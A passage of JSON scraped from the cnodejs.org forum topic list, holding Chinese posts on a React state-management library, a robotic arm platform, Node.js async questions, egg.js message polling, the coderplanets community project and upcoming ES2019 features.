class=\"markdown-text\"><p>论坛react用户多吗？在cnodejs处女宣布我的状态管理框架react-control-center准备开源了！做开源好累，api文档等都要精心维护，目前核心api都已经稳定了。\n个人项目用起来还是挺happy的，经过一步步抽象，准备开源出来，也许有人问有了redux，有了mobx，为什么还需要react-controller-center，因为我作为redux用户，\n还是觉得redux对代码的入侵挺大，在cc（react-control-center的简称）的世界里，一切数据都从state取，cc自动帮你广播你的状态到其他cc实例，引入cc对你现有的代码是0改动（如果你不需要启用cc的高级功能），你可以对已有项目渐进式的交给cc处理，局部替换，无论你的项目是否已经严重的redux化，cc并不会影响redux的工作,\n好了说了这么多，在未来的几天内会公布一个示例代码工程，引导大家逐步了解cc和使用cc.\n… 此贴 to be continued!</p>\n</div>","title":"最近五天疯狂coding，准备开源一个状态管理框架react-control-center","last_reply_at":"2019-02-01T01:20:53.092Z","good":false,"top":false,"reply_count":22,"visit_count":2599,"create_at":"2018-12-04T06:37:56.343Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"5c52b56005cc322e7b136aa1","author_id":"51f7359944e76d216a2c18db","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://github.com/TonyRobotics/gauss\">https://github.com/TonyRobotics/gauss</a></p>\n<p>Gauss6 是一款专为 ROS 社区和机器人学习者所设计的 6 轴机械臂学习平台，学习者可以操作机械臂学习 6 轴机械臂的标准结构、运动学和机器人控制。机械臂基于 ROS 开发，不仅可以帮助学习者了解 ROS 的编程结构，还可以在其构建上创意更多的应用程序。</p>\n<p>Gauss6 的受众群体:</p>\n<ul>\n<li>\n<p>ROS 学习者和开发者：\n为 ROS 中的机械臂开发提供必要的硬件。 您可以验证各种算法或测试您自己的代码。</p>\n</li>\n<li>\n<p>机器人应用开发者：\n开发自己的应用程序和模拟演示。</p>\n</li>\n<li>\n<p>机器人爱好者：\n任何用于创造性乐趣的案例</p>\n</li>\n<li>\n<p>创客：\n用于 DIY 和任何其他案例扩展。</p>\n</li>\n</ul>\n<p>可以选择位置模式（ x/y/z 和执行器工具末端的方向上）和关节模式（独立控制每个轴）</p>\n<p><img src=\"http://image.robostore.me/images/0/2019/0/6/5/1548491353283-7f761beb-0d9e-4ef6-8cb7-d1727e41a51c.png\" alt></p>\n<p>Blockly 是一套图形化编程平台，基于谷歌的开源平台 Google Blockly。通过该平台，用户可以通过拼图的方式进行编程，直观易懂。该平台还整合了机械臂专属的 API，以供用户随时调用\n<img src=\"http://image.robostore.me/images/0/2019/0/6/5/1548491406576-f2d1ab2b-bcc0-4b0c-aa2d-f95f43508cec.png\" alt></p>\n</div>","title":"六轴高斯机械臂","last_reply_at":"2019-01-31T08:44:16.599Z","good":false,"top":false,"reply_count":0,"visit_count":1101,"create_at":"2019-01-31T08:44:16.599Z","author":{"loginname":"itfanr","avatar_url":"https://avatars2.githubusercontent.com/u/4652694?v=4&s=120"}},{"id":"5c4fef27a4647e02328f1fe7","author_id":"5c4fedae3819b801aa5a261a","tab":"ask","content":"<div class=\"markdown-text\"><p>开源地址：<a href=\"https://github.com/yodaos-project/yodaos\">https://github.com/yodaos-project/yodaos</a></p>\n</div>","title":"如何评价rokit近期开源的YodaOS？","last_reply_at":"2019-01-31T02:57:53.296Z","good":false,"top":false,"reply_count":3,"visit_count":1142,"create_at":"2019-01-29T06:13:59.734Z","author":{"loginname":"PotentialSteffan","avatar_url":"https://avatars1.githubusercontent.com/u/24876673?v=4&s=120"}},{"id":"5c49e710f9075c1ef7137dad","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>不是 token 或者 sessionid 选一种技术使用即可，为何要两个都用，不解？</p>\n<p>源码：<a href=\"https://github.com/cnodejs/egg-cnode\">https://github.com/cnodejs/egg-cnode</a></p>\n<p>使用 sessionid 证据：</p>\n<p><img src=\"//static.cnodejs.org/FnHOKOjkFGVQDRS-yzJ1C-620rUU\" alt=\"image.png\"></p>\n<p>使用 token 证据：\n<img src=\"//static.cnodejs.org/FqBa8HgCGNpinxOd8C11DI16cxPR\" alt=\"image.png\"></p>\n</div>","title":"cnode 源码中，即用了 token 又用了 sessionid 技术，为何这么弄？","last_reply_at":"2019-01-31T00:39:51.501Z","good":false,"top":false,"reply_count":7,"visit_count":1487,"create_at":"2019-01-24T16:25:52.535Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c4ebbb23819b801aa5a20cd","author_id":"5b5d6fef58db3ccf66a4501e","tab":"ask","content":"<div class=\"markdown-text\"><p>看了一篇介绍js引擎的写的很详细,下面第一篇。\n<a href=\"https://segmentfault.com/a/1190000012925872\">js引擎超详细介绍</a>。\n<a href=\"https://zhuanlan.zhihu.com/p/34453198\">从输入url到服务器返回页面,整个过程经历了什么,超完整,超详细</a>\n第二个能验证你的前端是否体系完整！！！\n但,我看完还有一个疑问,链接中提到：<strong>js是单线程的,只有当所有同步任务执行完,才会执行异步任务</strong>。</p>\n<h3>我的问题：那异步方式优势是什么呢？</h3>\n<ol>\n<li>异步写法：</li>\n</ol>\n<pre class=\"prettyprint\"><code>const fs = require(&#x27;fs&#x27;);\nfs.writeFile(&#x27;test.txt&#x27;, 1234567899876543210, &#x27;utf8&#x27;, function (err) {\n  if (err) throw err;\n  else console.log(&#x27;写完成&#x27;);\n});\nfor(let i = 0;i &lt; 1000000;i++){\n  console.log( &#96;hello=${i}&#96; );\n}\n</code></pre><ol>\n<li>结果：文件夹<code>test.txt</code>会很快创建,但之后就一直输出<code>hello=···</code>,直到最后才会在<code>test.txt</code>中写入内容,并输出<code>写完成</code>。</li>\n<li>同步写法：</li>\n</ol>\n<pre class=\"prettyprint\"><code>const fs = require(&#x27;fs&#x27;);\nfor(let i = 0;i &lt; 1000000;i++){\n  console.log( &#96;hello=${i}&#96; );\n}\nfs.writeFileSync(&#x27;test.txt&#x27;, 1234567899876543210, &#x27;utf8&#x27;);\nconsole.log(&#x27;写完成&#x27;);\n</code></pre><h3>我的问题：异步写法与同步写法有什么区别呢？在性能上？仅仅是写的时候顺序不同么？</h3>\n<h3>虽然是老生常谈的问题,但自己一直不是特别懂到底异步好在哪里,之前只是人云亦云的用,求解答？</h3>\n</div>","title":"js引擎是单线程,那异步有什么优势呢?(已被解答)","last_reply_at":"2019-01-31T00:34:02.973Z","good":false,"top":false,"reply_count":14,"visit_count":1209,"create_at":"2019-01-28T08:22:10.025Z","author":{"loginname":"ailuhaosi","avatar_url":"https://avatars3.githubusercontent.com/u/30113164?v=4&s=120"}},{"id":"5c5161303819b801aa5a2d79","author_id":"5735889dc3e4ef7657ab12f1","tab":"ask","content":"<div class=\"markdown-text\"><p><a href=\"https://telegraf.js.org/#/\">https://telegraf.js.org/#/</a>\n看到了,这个, 有做过相关东西的小伙伴吗?</p>\n</div>","title":"nodejs写telegram bot","last_reply_at":"2019-01-30T15:41:22.150Z","good":false,"top":false,"reply_count":1,"visit_count":701,"create_at":"2019-01-30T08:32:48.541Z","author":{"loginname":"vipzrx","avatar_url":"https://avatars1.githubusercontent.com/u/5094958?v=4&s=120"}},{"id":"5c4930003b948a2b4ab710a6","author_id":"5c4926b16955112b99438477","tab":"ask","content":"<div class=\"markdown-text\"><p>目前的项目是一个App应用，后端API采用egg.js框架。\n现在有这样一个需求</p>\n<p>业务场景：</p>\n<ul>\n<li>API服务发送消息到阿里云消息服务 (MNS)</li>\n<li>需要一个服务，获取阿里云消息服务(MNS)队列的消息，然后进行相关的业务处理</li>\n<li>需要多个服务处理不同的业务 (比如发送短信，帖子新回复的提醒)</li>\n</ul>\n<p>考虑用egg.js框架的扩展定时任务+阿里云消息服务(MNS)长轮询</p>\n<p>代码示例:\n<a href=\"https://github.com/jerryhu/egg-mns-long-polling-experiment\">https://github.com/jerryhu/egg-mns-long-polling-experiment</a></p>\n<p>task部分的代码如下:</p>\n<pre class=\"prettyprint language-js\"><code>&#x27;use strict&#x27;;\nmodule.exports = {\n  schedule: {\n    type: &#x27;mns&#x27;,\n  },\n  async task(ctx, message) {\n    console.log(&#96;task1: ${message}&#96;);\n\n    const condition = true;\n    while (condition) {\n      try {\n        &#x2F;&#x2F; 获取消息\n        const resp = await ctx.app.alicloudMns.receiveMessage(&#x27;test-post-reminder-queue&#x27;, 25);\n        const data = Buffer.from(resp.body.MessageBody, &#x27;base64&#x27;).toString(&#x27;utf8&#x27;);\n        console.log(&#96;data: ${data}&#96;);\n\n        &#x2F;&#x2F; TODO: 新评论提醒\n\n        &#x2F;&#x2F; 删除消息\n        await ctx.app.alicloudMns.deleteMessage(&#x27;test-post-reminder-queue&#x27;, resp.body.ReceiptHandle);\n      } catch (err) {\n        if (err.name === &#x27;MNSMessageNotExistError&#x27;) {\n          console.log(&#96;没有消息: ${new Date()}&#96;);\n          continue;\n        }\n\n        console.error(&#96;获取消息出错 ${err.stack}&#96;);\n        break;\n      }\n    }\n  },\n};\n</code></pre><p>问题:</p>\n<ol>\n<li>扩展定时任务中长时间执行任务是否可行？</li>\n<li>有没有更优的解决方案（nodejs后端服务应用+阿里云MNS长轮询）？</li>\n</ol>\n</div>","title":"[egg.js] 扩展定时任务与阿里云消息服务MNS长轮询","last_reply_at":"2019-01-30T10:21:06.576Z","good":false,"top":false,"reply_count":11,"visit_count":1012,"create_at":"2019-01-24T03:24:48.616Z","author":{"loginname":"jerryhu","avatar_url":"https://avatars2.githubusercontent.com/u/1637137?v=4&s=120"}},{"id":"5c4d1177f9075c1ef7138710","author_id":"55c8131739273b9219336439","tab":"share","content":"<div class=\"markdown-text\"><p>尊敬的各位 CNODE 的观众朋友们大家好， 非常抱歉将非 Node 相关的 Elixir 以及 React 的内容悍然插入到这里, 但是鉴于 Node 和 React 的特殊关系以及 Node 在前端开发基础设施界的地位，更考虑到 cnodejs 社区一贯开放包容的优雅气质，还望各位管理员网开一面。。</p>\n<p>在开始各种流水账之前，先附上我一年来细心打磨的项目：coderplanets (为省电以下简称 CPS)</p>\n<p>网站地址: <a href=\"https://coderplanets.com\">https://coderplanets.com</a></p>\n<p>Github源码： <a href=\"https://github.com/coderplanets/coderplanets_web\">前端</a>， <a href=\"https://github.com/coderplanets/coderplanets_server\">后端</a>， <a href=\"https://github.com/coderplanets/coderplanets_admin\">管理端</a></p>\n<p><img src=\"https://user-images.githubusercontent.com/6184465/51784903-0afc7a00-218b-11e9-8ddb-08cf4df106f9.png\" alt=\"image\"></p>\n<p><img src=\"https://user-images.githubusercontent.com/6184465/51784915-2ff0ed00-218b-11e9-8bfd-2c11a5966603.png\" alt=\"image\"></p>\n<p><img src=\"https://user-images.githubusercontent.com/6184465/51785962-c11a9080-2198-11e9-89ef-f2d5d874c490.gif\" alt=\"demo\"></p>\n<p><img src=\"https://user-images.githubusercontent.com/6184465/51785972-d55e8d80-2198-11e9-8b63-74b3736919bb.gif\" alt=\"demo2\"></p>\n<blockquote>\n<p>如标题所示，网站目前还是雏形且处于内侧阶段，因此各种小问题难以避免，若您不幸踩雷恳请<a href=\"https://github.com/coderplanets/coderplanets_web/issues/new\">提交issue</a>, 我会第一时间修复。</p>\n</blockquote>\n<h2>coderplanets 是什么?</h2>\n<p><a href=\"http://coderplanets.com\">coderplanets.com</a> 是一个主要面向 IT 从业者的聚合社区, 灵感来源于 <a href=\"https://feedly.com\">feedly</a>、<a href=\"https://www.reddit.com\">reddit</a> 、<a href=\"https://frame.io/\">frame.io</a> 等优秀网站以及最主要的: <strong>程序员每天都在使用的文本编辑器</strong>。 简单的讲，她是一个由各种按照编程语言、框架、开发工具、兴趣爱好等<strong>独立的平等且个性化的</strong>子社区组成的社区平台。</p>\n<h2>为什么要做这样的社区？</h2>\n<p>长话短说，源于我之前在学习一些小众语言时，很难在网上找到像样的可以交流的地方, 本就不多的资料分散在各处，有价值的内容甚至多集中于知乎或简书这样的通用写作平台上，看起来很不方便，以 Elixir 为例, 在<a href=\"https://www.zhihu.com/search?type=content&amp;q=elixir\">知乎上搜索 Elixir</a>, 得到的 Elixir 护肤品问答结果甚至要多于 Elixir 语言本身；比如简书类的平台总喜欢在内容页下大面积&quot;智能推荐&quot;一些<a href=\"https://www.jianshu.com/p/bbba1cae9001\">莫名其妙的内容</a>等等， 令人十分尴尬; 再比如这类平台都几乎只有”帖子”这一种展现形式等等。(类似平台的类似问题至少还能写两页纸，这里不多展开)。</p>\n<p>不只是 Elixir, 几乎所有的小众语言/框架都面临这样的问题， 通用的平台其实不太适合讨论小众的问题，小众的论坛又基本是业余玩具性质(就比如 <a href=\"http://elixir-china.com/\">ElixirChina</a>), 不是每个小众语言/框架都有 cnodejs 这样的高质量论坛。另外在即使有限的几个论坛之间穿梭， UI/UX和域名的不一致也很容易给人造成困扰。</p>\n<p>当然我不是专业的产品经理，如果你看了觉得没什么共鸣甚至觉得我是杠精也很正常，但是之于我，这确实是实打实的痛点，这些平台的问题也不是改改样式或者简单的 PR 就能解决的, 很多我眼中的痛点都需要作出伤筋动骨的重构, 再加上技术之外的一系列限制, 基本上只剩下自己动手这一个选项了。</p>\n<p>另外，就线上垂直社区而言，IT 从业者可能是最“挑剔”的群体了，如果能服务好这个群体，以后再建立其他垂直社区时就会相对容易一些了（详见下文）。</p>\n<h2>CPS 有哪些特点?</h2>\n<h3>专注、纯粹、简洁</h3>\n<p>CPS 由开发者发起，最终面向广大开发者(所谓 <code>from makers, to makers</code>), 垂直服务于<code>IT从业者</code>这个领域, 同时为过滤细分领域里的噪音，一切设计都基于/围绕独立的子社区打磨而来。</p>\n<h3>符合直觉的 UI/UX</h3>\n<p>基于前后端分离的架构，没有无处不在的重刷页面和不必要的跳转，在保留了SEO能力的前提下，尽可能多的吸取了其他单页应用的众多优点。</p>\n<h3>Hackable</h3>\n<p>大到主题、布局，小到订阅社区排序和帖子列表是否显示分割线, CPS 提供了丰富的自定义选项。更重要且自然的，CPS 是完全开源和开放的，你可以添加任何你觉得有意思的功能， 吐槽代码或设计层面的任何细节。</p>\n<h3>更加现代</h3>\n<p>由于没有历史包袱，CPS 不论<a href=\"https://github.com/coderplanets/coderplanets_web/blob/dev/docs/architecture/intro.zh-CN.md\">前端</a>、<a href=\"https://github.com/coderplanets/coderplanets_server/blob/dev/docs/architecture/intro.zh-CN.md\">后端</a>还是一些<a href=\"https://github.com/coderplanets/coderplanets_web/blob/dev/docs/js/graphql.zh-CN.md\">基础设施</a>，都大胆采用了新的技术架构(乃至新的语言),</p>\n<h3>多种内容展现形式</h3>\n<p>除了传统的帖子以外，还有开源项目、视频、招聘，用户地图、cheatsheet、同城等等多种多样的内容展现形式。</p>\n<h2>使用了哪些技术栈？</h2>\n<h4>前端部分(<a href=\"https://github.com/coderplanets/coderplanets_web/blob/dev/package.json\">详细</a>)：</h4>\n<table>\n<thead>\n<tr>\n<th>框架/库</th>\n<th>开发</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"https://github.com/facebook/react\">React.js</a></td>\n<td>UI view 层</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/zeit/next.js\">Next.js</a></td>\n<td>同构 react 框架</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/styled-components/styled-components\">Styled-Component</a></td>\n<td>css-in-js 方案</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/apollographql/apollo-client\">Apollo-Client</a></td>\n<td>GraphQL 客户端</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/facebook/draft-js\">Draft.js</a></td>\n<td>MarkDown 编辑器</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/mobxjs/mobx\">Mobx</a></td>\n<td>react 状态管理</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/mobxjs/mobx-state-tree\">Mobx-State-Tree</a></td>\n<td>Mobx 最佳伴侣</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/ReactiveX/rxjs\">Rxjs</a></td>\n<td>异步事件管理</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/ramda/ramda\">Ramda</a></td>\n<td>各种工具函数</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<table>\n<thead>\n<tr>\n<th>框架/库</th>\n<th>DevOps</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"https://github.com/zeit/next.js\">Next.js</a></td>\n<td>SEO 支持，打包构建等</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/eslint/eslint\">Eslint</a> 和它的朋友们</td>\n<td>语法规范，纠错</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/prettier/prettier\">Prettier</a></td>\n<td>formatter</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/commitizen/cz-cli\">Commitizen</a></td>\n<td>规范 commit 消息</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/facebook/jest\">Jest</a> / <a href=\"https://github.com/airbnb/enzyme\">Enzyme</a></td>\n<td>单元测试</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/cypress-io/cypress\">Cypress</a></td>\n<td>端对端测试</td>\n</tr>\n<tr>\n<td><a href=\"https://travis-ci.org/coderplanets/coderplanets_web\">Travis</a></td>\n<td>CI 支持</td>\n</tr>\n<tr>\n<td><a href=\"https://sentry.io\">Sentry</a></td>\n<td>错误日志搜集</td>\n</tr>\n<tr>\n<td>Google-Analysis</td>\n<td>统计分析</td>\n</tr>\n<tr>\n<td>Docker</td>\n<td>容器支持(部署在阿里云)</td>\n</tr>\n</tbody>\n</table>\n<h4>后端部分(<a href=\"https://github.com/coderplanets/coderplanets_server/blob/dev/mix.exs\">详细</a>):</h4>\n<table>\n<thead>\n<tr>\n<th>框架/库</th>\n<th>开发</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"https://github.com/phoenixframework/phoenix\">Phoenix</a></td>\n<td>API 服务器</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/absinthe-graphql/absinthe\">Absinthe</a></td>\n<td>GraphQL 支持</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/absinthe-graphql/dataloader\">Dataloader</a></td>\n<td>GraphQL 查询优化</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/elixir-ecto/postgrex\">Postgrex</a></td>\n<td>PostgreSQL 数据库客户端</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<table>\n<thead>\n<tr>\n<th>框架/库</th>\n<th>DevOps</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"https://engine.apollographql.com\">Apollo-engine</a></td>\n<td>GraphQL网关, 监测，缓存等</td>\n</tr>\n<tr>\n<td><a href=\"https://hexdocs.pm/ex_unit/ExUnit.html\">ExUnit</a></td>\n<td>单元测试 / GraphQL 端对端测试</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/rrrene/credo\">Credo</a></td>\n<td>语法规范</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/jeremyjh/dialyxir\">Dialyxir</a></td>\n<td>静态代码检测</td>\n</tr>\n<tr>\n<td><a href=\"https://travis-ci.org/coderplanets/coderplanets_server\">Travis</a></td>\n<td>CI 支持</td>\n</tr>\n<tr>\n<td><a href=\"https://sentry.io\">Sentry</a></td>\n<td>错误日志搜集</td>\n</tr>\n<tr>\n<td>Docker</td>\n<td>容器支持(部署在阿里云)</td>\n</tr>\n</tbody>\n</table>\n<p>这里限于篇幅不再展开，更详细的文档请移步 github (<a href=\"https://github.com/coderplanets/coderplanets_web/tree/dev/docs\">前端文档</a> 以及 <a href=\"https://github.com/coderplanets/coderplanets_server/tree/dev/docs\">后端文档</a>)</p>\n<p>另外，我会逐步在知乎的专栏上持续分享有关 CPS 在技术、产品、设计上的各种点滴，欢迎关注。</p>\n<h2>一些花絮/彩蛋</h2>\n<ul>\n<li>网络/事件模块被命名为 sr71, 名字源于美军的 sr71 黑鸟侦察机</li>\n<li>多功能搜索框被命名为 Doraemon, 名字源于英译的哆啦A梦(机器猫)</li>\n<li>可以使用缩写跳转社区, 例如 k8s -&gt; kubernetes, js -&gt; javascript, wasm -&gt; webassembly 等等</li>\n<li>可以使用快捷键 C-p/C-g/esc 等呼出或隐藏 Doraemon, 就像在emacs, vim, vscode 等编辑器中一样</li>\n<li>可以在 Doraemon 输入 /theme 切换主题，以及各种类似操作</li>\n<li>匿名用户的头像是一个可爱的外星人头像</li>\n<li>不同社区中的成员分布地图有不同的名字， 比如 ruby 社区叫 rubylist, js 社区叫JSer 等等。。</li>\n<li>在文章中@用户的时候， editor上方会显示所 at 的用户的头像</li>\n<li>空内容页面会显示”星球老司机”的提示图，该老司机每次的行进方向是随机的</li>\n<li>打赏界面被模拟成吃 taco 的场景，原因是我喜欢吃 taco</li>\n<li>多功能滑出组件在某些页面卡顿时会显示巴萨队徽及其足球哲学：Take the Ball, Pass the Ball. – 我是十年巴萨球迷</li>\n<li>左侧边栏顶端会根据节日或重大事件显示不同的 logo</li>\n<li>回复企邮 <a href=\"mailto:hello@group.coderplanets.com\">hello@group.coderplanets.com</a> 的“员工”叫frank, 是的，就是操蛋的 Frank Gallagher</li>\n<li>页面侧边栏和底部是赞助商的鸣谢/推广, 如果贵公司有这方面的需要，注明来自 cnodejs 会有折扣优惠 :)</li>\n<li>还有很多(或者说未来还会添加很多)等你来发现 :)</li>\n</ul>\n<h2>期待你的参与和支持</h2>\n<p><img src=\"https://user-images.githubusercontent.com/6184465/51666005-02276f00-1ff8-11e9-92b5-4626cf6f1463.png\" alt=\"image\"></p>\n<p>CPS 从 0 到 1 的这一年来一直处于 “one man army” 的状态，这段经历孤独而美妙，付出和收获同样巨大。因此，您的每一次  <code>issue</code> / <code>pr</code> / <code>star</code> / <code>fork</code> / <code>推广</code> / <code>捐助</code> / <code>赞助</code> 等等都会被我视作莫大的鼓励和支持，在此先谢过 🌭 。</p>\n<p>更进一步的，这个项目从一开始在代码层面并不是只针对 CPS 本身，她致力于成为垂直社区界的 “WordPress”, 所依赖的底层通用的架构叫做 <a href=\"https://github.com/mastani-stack\">Mastani-Stack</a>, 她和 CPS 的关系类似于汽车平台和车型的关系，CPS 是 Mastani 平台的第一款“车型”。在 2019 年还计划有以下&quot;车型&quot; (域名都已注册，并非一时兴起)：</p>\n<table>\n<thead>\n<tr>\n<th>domain</th>\n<th>content</th>\n<th>prototype</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"http://top12s.com\">top12s.com</a></td>\n<td>足球领域的垂直社区</td>\n<td>以俱乐部, 国家队等子社区组成</td>\n</tr>\n<tr>\n<td><a href=\"http://motojie.com\">motojie.com</a> (摩界)</td>\n<td>摩托/摩旅领域的垂直社区</td>\n<td>以摩托旅行，地域，车型等子社区组成</td>\n</tr>\n<tr>\n<td><a href=\"http://cgplanets.com\">cgplanets.com</a></td>\n<td>CG 领域的垂直社区</td>\n<td>以 C4D, Blender, Maya 等子社区组成</td>\n</tr>\n<tr>\n<td><a href=\"http://designber.com\">designber.com</a></td>\n<td>设计领域的垂直社区</td>\n<td>待定, 偏向建筑和工业设计</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<p>和你第一眼看上去的感觉一样，这其中的工作量是巨大的(不仅仅单指技术层面), 什么时候能完成我无法给出具体 schdule, 但我可以向你保证的是, 这些&quot;车型&quot;都会被高水准的制造出来，不会半途而废。</p>\n<p>因此，如果你恰好也对这些领域感兴趣(或者任何你觉得有意思的垂直领域或有意义的非盈利组织), 不管你身处何方, 不论你擅长技术、文案、设计、推广、商务法律等或者其他方面，欢迎与我联系(或留下您的联系方式)，能和志同道合的人一起搞事情是人生最大的乐趣之一。</p>\n<p>最后作为福利，有请我团队的首席美女鼓励师兼中华田园界第一颜值 — 大美女“梅茜” 出场镇帖:</p>\n<p><img src=\"https://user-images.githubusercontent.com/6184465/51782415-c9f06f80-2162-11e9-9ab1-eed3692b8b12.png\" alt=\"image\"></p>\n<p>预祝各位新年快乐, 2019一起加油 !</p>\n</div>","title":"基于 Elixir-GraphQL-React 的新一代社区系统设计雏形","last_reply_at":"2019-01-30T06:55:40.933Z","good":false,"top":false,"reply_count":9,"visit_count":868,"create_at":"2019-01-27T02:03:35.145Z","author":{"loginname":"mydearxym","avatar_url":"https://avatars2.githubusercontent.com/u/6184465?v=4&s=120"}},{"id":"5c500adfa4647e02328f20d4","author_id":"5c4e697a3819b801aa5a1dde","tab":"ask","content":"<div class=\"markdown-text\"><p>请问下，上传图片，过滤图片格式怎么处理呢？仅仅是根据图片扩展名么?</p>\n</div>","title":"上传图片，过滤图片格式怎么处理呢？","last_reply_at":"2019-01-30T06:25:07.682Z","good":false,"top":false,"reply_count":4,"visit_count":944,"create_at":"2019-01-29T08:12:15.796Z","author":{"loginname":"hujunyuan8058","avatar_url":"https://avatars3.githubusercontent.com/u/37411247?v=4&s=120"}},{"id":"5c5114443819b801aa5a2b1e","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>译者按：</strong> 又过了1年…</p>\n<ul>\n<li>原文：<a href>What’s New in JavaScript for 2019</a></li>\n<li>译者: <a href=\"https://www.fundebug.com/\">Fundebug</a></li>\n</ul>\n<p><strong>为了保证可读性，本文采用意译而非直译。另外，本文版权归原作者所有，翻译仅用于学习。</strong></p>\n<p>最近这些年，ECMASCript标准发展节奏非常稳定，每年都会发布新的特性。那么，ECMASCript 2019可能会有哪些特性呢？</p>\n<h3>ECMASCript语法提案的批准流程</h3>\n<p>JavaScript的标准即为<a href=\"https://www.ecma-international.org/publications/standards/Ecma-262.htm\">ECMAScript</a>，其标准委员会是<a href=\"https://www.ecma-international.org/memento/tc39.htm\">TC39</a>。</p>\n<p>所有语法提案都需要经历标准的<a href=\"https://tc39.github.io/process-document/\">批准流程</a>，该流程包括5个阶段：</p>\n<ul>\n<li>Stage 0 - Strawman（展示阶段）</li>\n<li>Stage 1 - Proposal（征求意见阶段）</li>\n<li>Stage 2 - Draft（草案阶段）</li>\n<li>Stage 3 - Candidate（候选阶段）</li>\n<li>Stage 4 - Finished（定案阶段）</li>\n</ul>\n<p>只有语法特性到达Stage 4，该特性才能成为正式的ECMAScript标准。但是，JS引擎例如<a href=\"https://v8.dev/\">V8</a>(Chrome和Node.js)以及<a href=\"https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey\">SpiderMonkey</a>(Firefox)会试验性地支持Stage 4之前的语法特性，这样开发者可以进行测试和反馈。</p>\n<p>当我写这篇博客的时候，还没有新的Stage 4的<a href=\"https://github.com/tc39/proposals\">语法提案</a>，处于Stage 3的语法提案有好几个。ES2019可能不会包括所有Stage 3的语法提案。事实上，有些提案已经被搁置很多年了。</p>\n<h3>Class相关变化</h3>\n<p>有好几个提案是针对Class的，包括：</p>\n<ul>\n<li><a href=\"https://github.com/tc39/proposal-class-fields\">属性定义</a></li>\n<li><a href=\"https://github.com/tc39/proposal-private-methods\">私有方法及属性</a></li>\n<li><a href=\"https://github.com/tc39/proposal-static-class-features/\">静态方法及属性</a></li>\n</ul>\n<p>代码示例如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>class Truck extends Automobile {\n  model = &quot;Heavy Duty&quot;; &#x2F;&#x2F; 公有属性\n  #numberOfSeats = 5; &#x2F;&#x2F; 私有属性\n  #isCrewCab = true;\n  static #name = &quot;Truck&quot;; &#x2F;&#x2F; 静态私有属性\n\n  &#x2F;&#x2F; 静态方法\n  static formattedName() {\n    return &#96;This vehicle is a ${ Truck.#name }.&#96;;\n  }\n\n  constructor( model, seats = 2 ) {\n    super();\n    this.seats = seats;\n  }\n\n  &#x2F;&#x2F; 私有方法\n  #getBodyType() {\n    return this.#isCrewCab ? &quot;Crew Cab&quot; : &quot;Standard Cab&quot;;\n  }\n\n  bodyType() {\n    return &#96;${ this.#numberOfSeats }-passenger ${ this.model } ${ this.#getBodyType() }&#96;;\n  }\n\n  get seats() { return this.#numberOfSeats; }\n  set seats( value ) {\n    if ( value &gt;= 1 &amp;&amp; value &lt; 7 ) {\n      this.#numberOfSeats = value;\n      this.#isCrewCab = value &gt; 3;\n    }\n  }\n}\n</code></pre><p>个人认为，使用<code>#</code>来定义私有成员不是很好，学习其他语言，使用<code>private</code>来定义显然更好。</p>\n<h3>String的trimStart()与trimEnd()方法</h3>\n<p>String有一个trim()方法可以移除字符串开头和结尾的空格，而trimStart()与trimEnd()方法则可以分别移除开头和结尾的空格：</p>\n<pre class=\"prettyprint language-javascript\"><code>const one = &quot;      hello and let &quot;;\nconst two = &quot;us begin.        &quot;;\nconsole.log( one.trimStart() + two.trimEnd() ) &#x2F;&#x2F; 打印&quot;hello and let us begin.&quot;\n</code></pre><p>有趣的是，不少浏览器已经<a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/trimEnd#Browser_compatibility\">支持</a>了这2个方法。可见，浏览器们一直在推动ECMASCript标准的进步。</p>\n<h3>使用BigInt定义大整数</h3>\n<p>Number所能定义的最大整数为2^53 ，对于更大数，则可以使用<a href=\"https://github.com/tc39/proposal-bigint\">BigInt</a>来定义：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 最大的Number\nconst theBiggestIntegerToday = Number.MAX_SAFE_INTEGER; &#x2F;&#x2F; 9007199254740991\n\n&#x2F;&#x2F; 在整数后面添加n来定义BigInt\nconst ABiggerInteger = 9100000000000001n;\n\n&#x2F;&#x2F; 使用BigInt()\nconst EvenBigger = BigInt( 9100000000000002 ); &#x2F;&#x2F; 9100000000000002n\n\n&#x2F;&#x2F; 使用BigInt()\nconst SuchBigWow = BigInt( &quot;9100000000000003&quot; ); &#x2F;&#x2F; 9100000000000003n\n</code></pre><p>关于BigInt的更多使用示例，可以查看<a href=\"https://developers.google.com/web/updates/2018/05/bigint\">BigInt: arbitrary-precision integers in 